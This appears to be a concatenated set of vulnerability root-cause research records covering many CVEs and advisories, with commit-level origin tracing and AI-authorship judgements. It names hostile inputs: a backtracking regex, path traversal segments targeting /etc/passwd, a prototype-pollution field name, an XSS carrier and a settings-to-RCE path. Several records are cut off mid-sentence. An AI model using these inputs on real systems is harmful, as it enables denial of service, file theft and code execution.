causal_research.bug_semantics: A logged-in non-admin whose permission bits include Perms.SETTINGS may call set_config_value. Until c4cf995, the plugin branch of that API wrote any plugin option via config.set_plugin with no Role.ADMIN restriction. AntiVirus stores avfile (executable path) and avargs in plugin config and, when the addon is enabled and a download finishes, scan() invokes subprocess.Popen([avfile, avargs, target]). Setting avfile to an attacker-chosen binary therefore yields OS command execution as the pyload user (CWE-78), i.e. SETTINGS-to-RCE privilege escalation. Preconditions: reachable web/API auth, a Role.USER with SETTINGS, ability to enable the addon and cause a download_finished event. causal_research.bug_semantics: An authenticated chat user can supply the pattern used by knowledge grep. Patterns that look like regex (originally \|, .*, .+, .?, \d, \w, \s, or a character class; later also a bare |) are compiled with Python's backtracking re engine and executed with compiled.search() on every line of every file the user can read, with no timeout and with only result-count/file-count caps. The search runs synchronously in the ASGI worker. A crafted pattern such as (x|x)*y against a short non-matching subject pins one CPU core for an attacker-chosen duration (measured tens of seconds at 30 characters, extrapolating to hours at modestly longer lines) and stalls every other request on that worker. Default config hands the model grep_knowledge_files (ENABLE_KB_EXEC defaults False); kb_exec grep is the same

causal_research.bug_semantics: Buffer overflow in Zlib::GzipReader: zstream_buffer_ungets prepends caller bytes ahead of previously produced output but fails to guarantee the backing Ruby string has enough capacity before memmove shifts existing data, causing memory corruption.
evidence: Advisory rubysec gems/zlib/CVE-2026-27820.yml (GHSA-g857-hhfv-j68w, 2026-03-05): buffer overflow in Zlib::GzipReader via zstream_buffer_ungets failing to guarantee backing-string capacity before memmove; patched versions ~>3.0.1, ~>3.1.2, >=3.2.3; credit to reporter calysteon and patch by nobu.

git log -S'rb_str_capacity' reverse on ext/zlib/zlib.c: first writer is 5aa9cca1eadd2dcdc799db2b1c067a8e1f23c96c (2017-09-13 SHIBATA Hiroshi, Picked r58526 from ruby/ruby); diff changes zstream_buffer_ungets guard from 'NIL_P(z->buf) || RSTRING_LEN(z->buf) - z->buf_filled == 0' to 'NIL_P(z->buf) || (long)rb_str_capacity(z->buf) <= ZSTREAM_BUF_FILLED(z)', and changes zstream_expand_buffer_into to rb_str_modify_expand semantics.

Parent cd21420537e217faa5138b82b5c456b0fb2d1917 ext/zlib/zlib.c zstream_buffer_ungets has the safe RSTRING_LEN-based check and no rb_str_capacity use (grep count 0), confirming immediate-parent absence of the vulnerable capacity guard.

Direct fix 608d2be66fcbcb759cbe26c82e95f4381b8dd140 (Fix buffer overflow at ungetc, Nobuyoshi Nakada, 2025-11-26, on master; contained in tag v3.2.3) unconditionally calls zstream_expand_buffer_into(z, len) and removes the capacity-guard branch; test/test_zlib.rb regression test added. Branch backports 82d5d26993e9b7eafc79bb1b6be9f39c5db964f9 (v3.0.1) and 6cc139d87c498e60bcf38bc9e4f2ac0f2faa0eb1 (v3.1.2) carry the same hunk. Recorded fix_sha 2ce25b3cd8722250fd650c49bef96f8ce862aaf5 is the v3.0.1 tag merge commit.

Introducer author/committer SHIBATA Hiroshi <hsbt@ruby-lang.org>, empty body, no trailers/co-author markers. Fix author Nobuyoshi Nakada <nobu@ruby-lang.org>, committer Hiroshi SHIBATA, no AI markers. No AI indicators on either commit.
causal_research.flaw_origin: Commit 5aa9cca1eadd2dcdc799db2b1c067a8e1f23c96c (Picked r58526 from ruby/ruby, SHIBATA Hiroshi, 2017-09-13) first wrote the flawed guard in zstream_buffer_ungets: it replaced the safe 'NIL_P(z->buf) || RSTRING_LEN(z->buf) - z->buf_filled == 0' check with '(long)rb_str_capacity(z->buf) <= ZSTREAM_BUF_FILLED(z)'. Because rb_str_capacity can exceed the logical length, the expansion is skipped whenever capacity > filled even if capacity - filled < len, so the subsequent memmove(bufptr + len, bufptr, filled) and memmove(bufptr, b, len) can write past capacity.
causal_research.reasoning: The buffer-overflow mechanism is the capacity guard introduced in zstream_buffer_ungets by 5aa9cca1 in 2017, whose immediate parent used the safe RSTRING_LEN-based full-buffer check. The direct fix removes the flawed conditional and always expands the buffer. Both introducer (SHIBATA Hiroshi) and fix (Nobuyoshi Nakada) are long-time Ruby core human committers with no AI markers, so AI-written code did not cause this flaw.

causal_research.bug_semantics: Prototype pollution via dot-notation field names (CWE-1321) leading to instance-wide DoS: the Edit Fields (Set) node assigns output fields through a dot-notation path setter (lodash set) without restricting field names, so an authenticated workflow author can name a field after an inherited built-in method path (e.g. 'toString.call'). lodash baseSet reuses a value found at a path segment even when it is inherited, so the assignment writes onto a shared built-in object in the main Node.js process; that global is used on the request-authentication path, so every authenticated request then fails until process restart. Fixed by patching lodash 4.18.1 (pnpm patch patches/lodash@4.18.1.patch): baseSet only reuses a segment value when it is an own property (hasOwnProperty.call(nested, key)), so built-in-named segments are stored as plain own data; fixed in 1.123.67, 2.31.5, 2.32.1.

causal_research.bug_semantics: An application that registers Symfony's Mailtrap mailer webhook endpoint calls MailtrapRequestParser::parse(), which AbstractRequestParser forwards to doParse($request, $secret) with the configured webhook secret. From introduction through 7.4.11/8.0.11, doParse() never read $secret or any signature header; it JSON-decoded the body and mapped events (delivery, bounce, open, click, spam, reject, etc.) into MailerDeliveryEvent/MailerEngagementEvent. A network attacker who can POST to that URL can inject forged events without the secret, corrupting suppression lists and delivery metrics (CWE-306/CWE-347). Preconditions: Mailtrap webhook parser wired and reachable; secret may even be configured and still unused. Counterevidence: empty secret is documented as opt-in skip after the fix; sibling Sendgrid parser already verified signatures at the same time, so this was omission of the expected check rather than a missing framework hook.

causal_research.bug_semantics: Untrusted renderer JavaScript calls window.open(url, frameName, features) with a comma-separated features string. parseFeatures() in lib/browser/parse-features-string.ts parses every key/value, peels a small webPreferences allowlist, and (before the fix) returns the remaining map as BrowserWindowConstructorOptions. openGuestWindow() in lib/browser/guest-window-manager.ts spreads those parsedOptions into new BrowserWindow({ webContents: guest, ...browserWindowOptions }), so keys such as icon reach the main-process window constructor and can make it open attacker-chosen file or UNC/network paths. Preconditions: the app allows window.open for untrusted content and does not fully set child options via setWindowOpenHandler/overrideBrowserWindowOptions. Apps that deny window.open or override every option are out of scope. webPreferences already had a separate allowlist; the missing control was top-level window options.

causal_research.bug_semantics: HAXiam is a multi-site packaging wrapper for HAXcms that stores each user's microsite under per-user directories users/<username>/ and users_sites/<username>/, which the Apache web server serves directly. Because the server responds per-path, a request whose username corresponds to an existing user directory returns HTTP 200 (served content), whereas a request for a non-existent user has no matching directory/file and receives Apache's raw 404. This observable response discrepancy (200 for valid vs 404 for invalid, CWE-204) lets an authenticated attacker enumerate valid account names by brute-forcing usernames and watching the status code, and combine it with missing authorization checks to deface other users' sites. No PHP logic differs between the two cases—the leak is purely the per-user directory layout plus the absence of a uniform not-found response.
causal_research.evidence: Advisory CVE-2025-54129 / GHSA-wh3h-vfcv-m5g5: CPE cpe:2.3:a:psu:haxiam, affected <=11.0.4, patched 11.0.5, CWE-204 (observable response discrepancy); affected resource /system/api/getUserData; PoC shows 404 (invalid user) vs 200 (valid user). Fix commit 9d578d8ae308a8a061213f92d205b846581bcb5d (message “https://github.com/haxtheweb/issues/security/advisories/GHSA-wh3h-vfcv-m5g5”) adds users/.htaccess (ErrorDocument 404 /403.php), users/403.php (headers 403 + JSON), users_sites/.htaccess, users_sites/403.php — pure Apache config, no PHP endpoint change; tagged 11.0.0 and shipped in 11.0.5 (tag 4e59d6d69f3c7c1b0406e2d9999dfe12af92727d, VERSION.txt 0.0.7->11.0.5). BIC 5744b5835029bac57425fe81d8398132a1dc0ef6 first creates users/ and users_sites/ (git log --oneline --follow -- users/ = [5744b58, 9d578d8]; 5744b58 earliest); its diff shows new users/.gitkeep and users_sites/.gitkeep. Parent absence verified: git ls-tree 0acd8396a6cd8b23f12e2d1e7578431e0083924f --name-only returns only LICENSE (no users/, users_sites/). BIC git cat-file commit: author/committer btopro <btopro@outlook.com> 1550286533, body “beginning of the end”, no AI trailers.
causal_research.flaw_origin: Commit 5744b5835029bac57425fe81d8398132a1dc0ef6 (“beginning of the end”, 2019-02-15) is the project's first substantive commit (the parent 0acd839 is a LICENSE-only “Initial commit”) and the commit that first created the per-user directory layout users/ and users_sites/ (initially as .gitkeep placeholders that later hold each user's microsite). This layout is the structural root of the discrepancy: it makes user presence directly observable over HTTP, so a valid user's path is served (200) while an absent user's path 404s. No earlier commit created this tree (git log --oneline --follow -- users/ returns 5744b58 as the first commit touching it), and login.php's is_dir(IAM_ROOT.’/users/’.$userVar) confirms the scheme was in force from this layout.
causal_research.reasoning: This is a CWE-204 observable-response-discrepancy (user enumeration), not a logic bug, so the vulnerable “lines” are the structural element that makes user presence observable over HTTP. The fix (9d578d8, whose message cites the GHSA and which ships in 11.0.5) changes no PHP endpoint — it only adds .htaccess/403.php under users/ and users_sites/ so Apache returns 403 instead of its raw 404 for non-existent user paths, erasing the 200-vs-404 signal. That pinpoints the vulnerable condition as the per-user directory layout itself (users/<user>, users_sites/<user>). git log --oneline --follow -- users/ shows 5744b5835029bac57425fe81d8398132a1dc0ef6 is the earliest commit touching that tree, and its parent 0acd8396a6cd8b23f12e2d1e7578431e0083924f is a LICENSE-only Initial commit (verified via git ls-tree), so the layout is absent at the parent and first written by 5744b58 (“beginning of the end”, 2019-02-15). 5744b58 is the project‧s original substantive commit, not a move/refactor/revert/squash, so it is the BIC. It lands far below the advisory's vulnerable 11.0.x range (2019) and the fix lands at/after the 11.0.5 patched version — consistent. The BIC predates AI coding tooling (2019): human author/committer btopro <btopro@outlook.com>, commit body only “beginning of the end”, and git cat-file commit shows no Co-authored-by/Generated-with/bot markers — no AI signal on the BIC. causal_research.bug_semantics: When uutils nohup sees a tty on stdout it creates or appends to nohup.out (else $HOME/nohup.out) and dup2s that fd over stdout/stderr. Through 0.8.0 the open is OpenOptions::new().create(true).append(true) with no Unix mode, so a new file is created 0o666 masked by umask (commonly 0644). POSIX requires S_IRUSR|S_IWUSR on create; GNU nohup opens O_CREAT|O_WRONLY|O_APPEND with that mode after umask(0). On a multi-user host any local user can then read the detached job's captured output. Preconditions: Unix, stdout is a terminal, the output file is newly created, and the process umask leaves other-read. Existing nohup.out files keep prior permissions (same as GNU).

descriptions: PraisonAI before 1.5.115 contains an information disclosure vulnerability in the MultiAgentLedger component that allows attackers to access sensitive data by registering agents with duplicate IDs. Attackers can exploit the lack of agent ID uniqueness enforcement to share ledger instances and expose system prompts and conversation history between agents.
Exposure of Resource to Wrong Sphere

mechanism_research.causal_chain: The named MultiAgentLedger returns a token-accounting object whose system_prompt/history fields are integer totals; tracking converts content to counts. Identical IDs intentionally return the same object inside one owner-created ledger, with no tenant principal in that API. The actual MultiAgentContextManager has a separate map of context managers and an explicit sharing-policy function; those are not the ledger data store. ContextSnapshot can hold content, but its ordinary to_dict emits budget/ledger/utilization and history_turn_count rather than those content fields. Optional monitor output is a different data path. The 1.5.114 and 1.5.115 wheel comparison binds identical ledger bytes including the nonblank-ID guard, so that guard neither creates tenant isolation nor repairs raw prompt disclosure from this statistics object. The published claim that duplicate ledger IDs disclose raw prompts/history is contradicted by the named representation. Monitor output paths are application-configured; MultiAgentMonitor keys and filenames derive from supplied agent IDs (643–658), not authenticated principals. This establishes a distinct optional local logging capability, not a remote unauthorized read endpoint. Filename sanitization is not principal isolation; an application sharing IDs/output access across tenants would need separate ownership controls. No such consumer or protected-reader path is established by the named ledger claim. causal_research.bug_semantics: A POST to an App Router app that has at least one Server Action compiled for the Edge runtime reaches handleAction in packages/next/src/server/app-render/action-handler.ts. On `process.env.NEXT_RUNTIME === 'edge'`, multipart bodies were parsed with `req.request.formData()` and non-multipart bodies were fully buffered via `req.body.getReader()` with no running byte count. Node applied `serverActions.bodySizeLimit` (default 1 MB) through a Transform that throws ApiError 413, but that limit lived only in the Node branch after 64e2ffc. An unauthenticated client can therefore send an arbitrarily large action body and force the Edge isolate to allocate until memory is exhausted (CWE-770). Host-level request caps (advisory workaround: 5 MiB) can shrink the blast radius but are not the framework fix.

mechanism.counterevidence: The node-runtime branch of the same handler is bounded (sizeLimitTransform at :945 plus busboy fieldSize), so the over-read is edge-specific rather than a general Server Action defect. For the non-multipart fetch shape getActionModIdOrError rejects unknown ids before the body is read, which raises the bar to a leaked action id; the multipart shape stays open. The patched edge path in 669426f454 counts bytes before buffering past the limit, so no residual bypass remains on the fixed lines.
mechanism.impact: Unbounded per-request memory allocation in the edge worker; memory exhaustion and worker crashes (availability loss), CWE-770; advisory CVSS 4.0 rates availability impact L and attack requirements P.
mechanism.preconditions: Edge runtime request path (process.env.NEXT_RUNTIME === 'edge' and isWebNextRequest) and at least one Server Action defined so the early hasServerActions() 404 is skipped; no authentication needed, and the multipart shape needs no valid action id because the body is parsed before id validation. The CSRF origin check only rejects when origin and host are both present and mismatched, and merely warns when origin is absent, so handcrafted requests pass.
mechanism.summary: An App Router app whose Server Action requests run on the Edge runtime (NEXT_RUNTIME === 'edge') accepts action POST bodies with no size enforcement: handleAction parses multipart bodies with req.request.formData() and accumulates non-multipart bodies with a req.body.getReader() loop, both unbounded, so a large body forces unchecked memory growth and worker OOM (CWE-770).
mechanism.trigger: POST to an app route with at least one Server Action while the request is served by the edge runtime: either content-type multipart/form-data (isMultipartAction; parsed before any action-id check) or a fetch action with the next-action header and a valid action id, carrying a body larger than serverActions.bodySizeLimit (default 1 MB) up to arbitrary size.
mechanism.vulnerable_code: packages/next/src/server/app-render/action-handler.ts:806 (const formData = await req.request.formData(), edge multipart) and :885-892 (req.body.getReader() loop appending chunks, edge non-multipart) with '// TODO: add body limit' at :792, at pre-fix commit cfab3698.

This is a real, edge-only resource-exhaustion defect: the Edge-runtime branch of handleAction buffered Server Action request bodies with no size limit, so an oversized POST could exhaust worker memory (CWE-770). causal_research.bug_semantics: POST /api/attachments/:datasourceId/url is a workspace-scoped endpoint that loads an S3 datasource by ID with enriched credentials and signs a PutObject URL for the caller-supplied bucket and key. A public caller who knows a workspace ID (x-budibase-app-id) and an S3 datasource ID can therefore obtain a 15-minute presigned PUT URL minted with the stored IAM keys and write wherever those keys allow, including attacker-chosen buckets.

causal_research.bug_semantics: When twoFactor is enabled, email/username/phone-number sign-in still creates a full session and, if session.cookieCache is on, setCookieCache writes a signed session_data cookie. The two-factor after-hook then tries to retract that session: deleteSessionCookie, delete the DB row, and issue a two_factor challenge cookie. After session-store chunking, deleteSessionCookie only expires session_data names already present on the inbound request; a first-time sign-in therefore leaves the new unchunked session_data Set-Cookie in the response while session_token is expired. getSession prefers a still-valid cookie cache and returns {session,user} without consulting the database or two-factor state, so an attacker with primary credentials can call authenticated routes (and even 2FA-gated endpoints th
causal_research.flaw_origin: Cookie cache originally expired session_data in deleteSessionCookie (22abc4aca / v1.3.x). PR #5645 member 80fbe2deee0f77618bb59967179fc27cedbc24bb (feat: session store) first replaced that unconditional expire with createSessionStore.clean(), which only clears request-header chunks. That is the first write of the bypass. The change landed via squash 0aa6dff678afeabdaba5bcbecc10e5b2413a6b77 in v1.4.0-beta.15 / v1.4.0. The 2FA hook already called deleteSessionCookie at the parent; the new clean() path is what left cookieCache live across the 2FA challenge.

causal_research.bug_semantics: Unauthenticated clients can POST FileExplorerData.root path segments into FileExplorer.preprocess. Before 6.16.0 that method joined the configured root_dir with those segments via os.path.join then os.path.normpath and returned the result to the app callback. os.path.join discards the root_dir prefix when any segment is absolute (example: ['/etc/passwd']), and without _safe_join a ['..', '..', 'etc', 'passwd'] payload resolves outside root_dir. The callback is documented to receive selections inside root_dir, so apps that read/serve that path leak arbitrary files (CWE-22). The sibling ls() endpoint already confined paths with _safe_join/safe_join; preprocess did not.

causal_research.bug_semantics: An unprivileged local process can open a CAN BCM socket (PF_CAN/SOCK_DGRAM/CAN_BCM) and arm TX/RX interval or throttle hrtimers. After ca109491, those hrtimer callbacks run in hardirq and only bounce work to per-op tasklets whose callback argument is the raw bcm_op pointer. Close/teardown (bcm_remove_op) cancels the timers, kills the tasklets, then kfree's the op. The hrtimer can still fire and schedule the tasklet across that window, so the tasklet later dereferences the freed bcm_op (CWE-825). Attacker-controlled slab reuse of that object yields arbitrary kernel code execution and local root. The 2017 cancel/kill loop did not close the race; the 2019 fix runs the handlers in HRTIMER_MODE_SOFT and deletes the tasklets.

causal_research.flaw_origin: Human (non-AI) origin: XWIKI-2110 (4c7802b5a8d8842c911b48d1000ef2e6fc785ad1, 2010-09-09, cjdelisle <calebdelisle@lavabit.com>) replaced the escaped property display in commentsinline.vm with $commentDoc.getRenderedContent($comment.getProperty('comment').getValue(), $doc.getSyntax().toIdString()), so comment text is parsed as document-syntax markup and XWiki style parameters let a comment author emit CSS that restyles the whole page. The 2012 XWIKI-7878 change only moved the same call to the restricted transformation mode (script macros blocked, markup and CSS rendered), and the 2026 XWIKI-23433 fix closes the clickjacking impact at the frontend by requiring confirmation before navigating to an untrusted domain.
causal_research.flip_condition: A commit-object AI marker (tool trailer, bot author) or a first-party authoring disclosure bound to 4c7802b5a8d8842c911b48d1000ef2e6fc785ad1 would flip NOT_AI to AI_ROOT_CAUSE. A reachable earlier object that already rendered raw comment markup in this template lineage would move the BIC, and a later change that removed or re-entered the restricted rendering context would too. A first-party advisory revision withdrawing the clickjacking claim, or a released build that navigates to untrusted domains without the confirmation gate, would flip the case toward FALSE_POSITIVE or reopen it.
causal_research.mechanism: Trigger: a user with comment permission posts markup whose style parameters (or rendered HTML) carry CSS, for example rules covering the page with a large link to a malicious host. Vulnerable code: the flamingo commentsinline.vm template renders the comment property through the document rendering pipeline; at tag xwiki-platform-17.4.5 that is $commentDoc.getRenderedContentRestricted($comment.getProperty('comment').getValue(), $doc.getSyntax().toIdString()) on line 207, and the restricted transformation context blocks script macros while still emitting markup and style attributes. Impact: the injected CSS turns the page into a link area to the attacker page, so a click anywhere on the page navigates the victim off-site. Preconditions: comment or annotation write access (the advisory states all versions are impacted; guest commenting depends on wiki configuration) and a victim click. Counterevidence: the call runs in the restricted mode, so scripts do not execute, and the advisory explicitly keeps comment CSS injection as intended behavior, so the defect is the unrestrained link navigation rather than the rendering itself.
causal_research.reasoning: The advisory is active and describes a real, first-party-confirmed mechanism, so this is not a false positive. The BIC is the 2010 XWIKI-2110 object 4c7802b5: its immediate parent tree carries the same template with the escaped property display (parent blob hash equals the patch pre-image), and the commit replaces it with getRenderedContent of the raw comment value, which is what first lets comment markup and style parameters reach the renderer in this lineage. The 2012 restricted-mode change is hardening of script execution only and the advisory itself keeps comment CSS injection as a feature, so neither 41318b67 nor the 2010/2011 $commentDoc plumbing commits (229a7ad2629, 6e52cf53f84) is a better BIC; the 2015 copy into the flamingo skin relocates existing exposure. AI: the BIC object is a 2010 SVN import with a named human author and committer, the same window shows named human identities throughout with no AI-attribution convention, and the fix objects are human-authored with human collaborators, so the record lands on NOT_AI rather than EVIDENCE_GAP. Fix closure: the master fix 7b5a4f8c adds the untrusted-link confirmation and its configuration, the GHSA-cited object 29cb81f3 is its cherry-pick, and all three declared patched releases contain their respective cherry-picks by ancestry, so the clickjacking surface the advisory names is repaired; no unclosed path is asserted.
causal_research.remaining_gap: No open path for the advisory's named surface: the clickjacking chain is repaired on all three declared patched release lines by the frontend confirmation, and the record names the closing objects. Scope note: the CSS-injection capability itself is retained by design per the advisory's own patch statement, so a future advisory that reframes injectable comment CSS as the defect itself would need a new BIC; the next smallest question then would be whether any commit restricts style parameters or embedded HTML in rendered comment markup.

causal_research.bug_semantics: IDOR in message deletion (CWE-862): DELETE /api/messages/:conversationId/:messageId lets any authenticated user delete any other user's messages. validateMessageReq middleware only checks that conversationId belongs to the requester, but the handler calls deleteMessages({ messageId }) with only messageId as the MongoDB filter, no user/conversation constraint. An attacker passes their own valid conversationId plus the victim's messageId to permanently delete the victim's message. Incomplete fix of CVE-2024-41703 (which added the middleware but left the model filter bare). Fixed in 0.8.4-rc1.
causal_research.evidence: Vulnerable call confirmed at v0.8.3: api/server/routes/messages.js line 405-414 'router.delete("/:conversationId/:messageId", validateMessageReq, ...) await deleteMessages({ messageId })' - no user/conversation filter. git log -S 'deleteMessages({ messageId })' on the route file returns exactly two commits: 7dc27b10f (introducer, 2023-08-22) and 189cdf581 (fix). causal_research.bug_semantics: OpenAI API authentication bypass in vLLM: AuthenticationMiddleware derives the URL path from starlette's URL reconstructed from request scope (request.url.path in the original implementation, then URL(scope=scope).path after a refactor) and strips root_path from that reconstructed path. causal_research.bug_semantics: Algorithmic-complexity DoS in django.core.serializers.xml_serializer.getInnerText(). The function collected descendant text node data into a Python list and returned the list joined with "".join(...) as a STRING; the ELEMENT_NODE branch then did inner_text.extend(getInnerText(child)), i.e. list.extend() on a str, which iterates the child's full inner text and appends one list element PER CHARACTER. Each nesting level re-splits the accumulated text of all descendants into per-character list elements, so on XML with nested element chains the total work grows quadratically (O(n^2)) in input size, letting a remote attacker craft XML that triggers CPU/memory exhaustion when processed by the XML Deserializer (loaddata / fixture deserialization).

That commit added getInstanceScopeId, documented and tested that a url-only or key-only context returns '', and wired handleWorkflowVersions / createBackup to WorkflowVersioningService(instanceId=getInstanceScopeId(context)) with no ENABLE_MULTI_TENANT fail-closed. Combined with the already-landed HTTP gate from 853015d0897be7cf2d9d4726de195c938e4395ab (which intended to require both tenant headers but implemented AND, so one-of-two headers still became a context), a multi-tenant HTTP tenant could reach leftover default-scope backups. Immediate parent 0f3d3f57f015d6e21d4f4b27683d0eafeff84439 has neither getInstanceScopeId nor instance-scoped version reads.
causal_research.flip_condition: an AI marker (trailer, co-author or bot author) on ced57ab2ae17, or a first-party disclosure bound to that change; fix-side AI markers are already recorded and are informational only, so they do not move this verdict.

evidence: Vendor GHSA/CVE range is n8n-mcp <= 2.57.3, first patched 2.57.4.

The default-scope mapping itself first ships in 2.56.1 (GHSA-j6r7 isolation). Versions <=2.56.0 had unscoped workflow_versions (separate GHSA-j6r7-6fhx-77wx). Vendor still lists <=2.57.3 for this GHSA; BIC is an ancestor of every 2.56.1–2.57.3 tag inspected.

Public merge carrier is ed0447d8a0a87ad45436ff5ee1af49a76667c965 (Merge: 0f3d3f5 ced57ab; message 'fix(versions): scope workflow_versions per instance (GHSA-j6r7-6fhx-77wx)'). Finer public member is the second parent ced57ab, which is the BIC used here.
No further public members of ced57ab are recoverable; private-fork SHAs mentioned on unrelated GHSA-jxx9 squash 853015d (e.g. f3c9371) are not objects in this clone and are not this BIC.
CVE.org CVE-2026-55608 state=PUBLISHED (cveawg.mitre.org/api/cve/CVE-2026-55608); GHSA-2cf7-hpwf-47h9 withdrawn_at=null on the first-party advisory and GitHub Advisory Database.

Source: ENABLE_MULTI_TENANT=true HTTP POST /mcp with only one of x-n8n-url / x-n8n-key. At v2.57.3 (b0f5e25d22c1e28363c27aee160518c301341edc) src/http-server-single-session.ts rejects only when !hasUrl && !hasKey, then if (hasUrl || hasKey) builds InstanceContext with the missing field undefined.
Mapping: getInstanceScopeId (src/types/instance-context.ts) hashes url+key only when both are present and otherwise returns ''.

Sink: handleWorkflowVersions in src/mcp/handlers-n8n-manager.ts constructs WorkflowVersioningService(..., getInstanceScopeId(context)) with no multi-tenant fail-closed, so list/get/delete/rollback/prune run against local workflow_versions rows whose instance_id is the empty default scope.

Vendor tests added in the fix (tests/integration/security/ghsa-j6r7-workflow-versions.test.ts) seed a default-scope backup and show a partial context (n8nApiUrl without n8nApiKey) could get/list/delete it before the handler guard.

causal_research.reasoning: CVE-2026-55608 / GHSA-2cf7-hpwf-47h9 is a published incorrect-authorization bug, not a withdrawn false positive: in multi-tenant HTTP mode a partial tenant context maps onto n8n-mcp’s local default-scope workflow_versions store. The smallest first-write of that mapping is ced57ab2ae17da2c35e51209bcdb774043f1320b (getInstanceScopeId plus handleWorkflowVersions wiring). Its parent tree lacks those lines; the commit is an atomic public member, with ed0447d only the v2.56.1 merge carrier. Unscoped backups from 04e7c53 are a different advisory (GHSA-j6r7) that ced57ab attempted to close; the residual is treating incomplete credentials as the shared '' tenant without a multi-tenant fail-closed. The HTTP AND-check from 853015d is a contributing incomplete GHSA-jxx9 control that lets one-of-two headers become a context, but it did not create default-scope instance_id and is not the BIC. Direct fix c1ca1e7 (released via merge/tag 1f42899 / v2.57.4) closes the same source (require both headers) and sink (fail closed on empty scope in multi-tenant mode) and is absent from v2.57.3. AI is judged only from the BIC commit object, which carries Co-Authored-By Claude Opus 4.8 on the commit that first wrote the flawed scope function and handler wiring, which is AI_ROOT_CAUSE.
causal_research.remaining_gap: Residual chain: ced57ab2 (v2.56.1 empty-scope mapping) + 853015d (AND gate) -> closed by: c1ca1e7 (v2.57.4 both headers required + empty scope fail-closed)

causal_research.bug_semantics: The digits parameter parsed from a provisioning URI is validated only with a lower bound (value > 0) and has no upper bound; OTP generation computes $code % (10 ** $this->getDigits()) (src/OTP.php:283), and when digits is large enough that 10 ** digits overflows PHP's integer range to 0 (digits >= 40 on 64-bit PHP 8.x), the modulo by zero raises an uncatchable DivisionByZeroError out of at()/now()/verify() (unauthenticated DoS via hostile otpauth:// URI)
evidence: advisory GHSA-g7m4-839x-ch6v: digits param validated only lower-bounded ($value > 0) at src/OTP.php, generateOTP computes $code % (10 ** digits), overflow to 0 yields DivisionByZeroError

direct fix fb651c9 'fix: bound the digits parameter to prevent DivisionByZeroError (GHSA-g7m4-839x-ch6v)' introduces OTPInterface::MAX_DIGITS = 10 and rejects digits outside 1..10 in both the parameter validation callback and defensively in getDigits()
git log -S 'pow(10' first occurrence is ee01b7d6 (2014-02-24) which creates lib/OTPHP/OTP.php: return $code % pow(10, $this->getDigits()); with setDigits() storing the value unchecked
parent 914ef900 tree has lib/OTPHP/HOTP.php and TOTP.php only; no lib/OTPHP/OTP.php exists, so the modulo-on-unbounded-digits behavior is absent in the immediate parent
678cb061 (2018-10-26, coding standards) rewrote pow(10, ...) as 10 ** ..., mechanically identical arithmetic with the same overflow-to-zero behavior; not a new introducer

causal_research.bug_semantics: POST /sso/register (createOIDCProvider / registerSSOProvider) is session-authenticated and accepts optional body.organizationId, which is stored on ssoProvider. From first write through the 1.6.10 line, that create path never required an organization owner/admin role. After 9c461962 it required only a member row (BAD_REQUEST if missing), so any org member could attach an attacker-controlled OIDC/SAML IdP to an organization they did not administer. Companion list/get/update/delete endpoints added in d0ed1a63 already required isOrgAdmin (owner|admin) for the same org-linked resource, producing the authorization mismatch described by GHSA-gv74-j8m3-fg5f. The sink is /sso/callback/{providerId}: when organizationProvisioning is enabled, IdP-asserted users are inserted as members of provider.org
causal_research.flaw_origin: The missing admin authorization on org-linked SSO registration was first written in public PR #951 member c4eb9fed378c1181b88b798464b842dd17fbadbf (feat: sso, 2024-12-19), which added packages/better-auth/src/plugins/sso/index.ts createOIDCProvider at /sso/register, bound organizationId: body.organizationId under sessionMiddleware, and provisioned callback users into that org. That member was squash-merged to main as f9102b1542175ffb89f0c286759944e7b9dc2314. Immediate parent 1e61852f3952c3cc4e521e53569598c4c6e75047 has no SSO plugin. Later 9c4619626856bd4adbaa4564dd8c110921b1f498 is incomplete remediation (membership without role); 791abb26ad1367639d4e47dec6a4f01cd004634e is a move into packages/sso/src/routes/sso.ts.

causal_research.bug_semantics: Jodit's clean-html sanitizer is the claimed XSS boundary. On value-set, onBeforeSetNativeEditorValue assigns attacker HTML into a sandbox (sandBox.innerHTML = data.value), runs safeHTML, then writes sandBox.innerHTML back so the editor reparses it. A MathML carrier (math > mtext > table > mglyph > style hiding ) makes the parser treat the img as style rawtext, so the element-only walk (Dom.isElement / $$('[onerror]') / $$('*')) never sees an on* attribute. Serialize-reparse hoists the img into the HTML namespace with the handler intact. The async visitor reaches that live node but sanitizeHTMLElement only removes onerror, so onload/onfocus persist in editor.value. A consumer that does element.innerHTML = editor.value executes the handler with no extra click. Before 4.11.1 the same sanitizer only stripped onerror, so a bare onload survived without a carrier; 4.11.1's removeEventAttributes closed the bare-handler case on the value-set walk but still missed rawtext, so the carrier remained sufficient through 4.12.27.

causal_research.bug_semantics: Unauthenticated callers can list every team of any Gogs organization whose name they know. GET /api/v1/orgs/:orgname/teams is mounted on the public /orgs/:orgname Macaron group with only orgAssignment(true), which loads the org user by username and does not require a token or membership. The handler (historically org.ListTeams, later listTeams) calls GetTeams, which issues WHERE org_id=? and returns all teams, then serializes id, name, description, and permission (read/write/admin/owner) with no IsLogged/IsTokenAuth check. APIContexter only wraps the request context; ReqToken/reqToken is opt-in and was applied to sibling routes such as /user/orgs but never to this group until the 2026 fix. causal_research.bug_semantics: skill_view is a remotely reachable Hermes tool. The attacker-controlled `name` argument is joined onto each trusted skill search root (`SKILLS_DIR / name`, later `search_dir / name`) and accepted as skill_dir if that path is a directory containing SKILL.md. A value such as `../outside-skill` therefore resolves to a sibling (or ancestor) of ~/.hermes/skills. The code later notices the resolved SKILL.md is outside trusted roots but only logs a warning. Linked-file reads then do `target_file = skill_dir / file_path` and call has_traversal_component/validate_within_dir against the already-escaped skill_dir, so a benign file_path like `.env` is treated as in-bounds and returned to the tool caller. Source: untrusted tool arg `name`. Sink: filesystem read of SKILL.md and of file_path under the escaped directory.

mechanism.impact: Cancellation, marking paid/complete, archiving and processing of orders plus capture of authorized payments without edit_orders; marking shipments delivered and rewriting carrier tracking without edit_orders; product data mutation without edit_products; role creation and user deletion without adequate permission; privilege escalation through the RBAC screens; payment/currency/carrier configuration flips; password-field injection into customer creation; client-side ID tampering; stored XSS on the admin barcode renderer.
mechanism.preconditions: An authenticated admin-panel session with at least the read-level permission the page mount checked (read_orders, browse_orders, access_setting) or, for Team/Index and the product sub-forms, any authenticated panel access; the affected Livewire components are separately addressable and their Eloquent properties were not #[Locked], so id tampering bypassed the parent page guard (Product/Edit.php does authorize edit_products at mount).
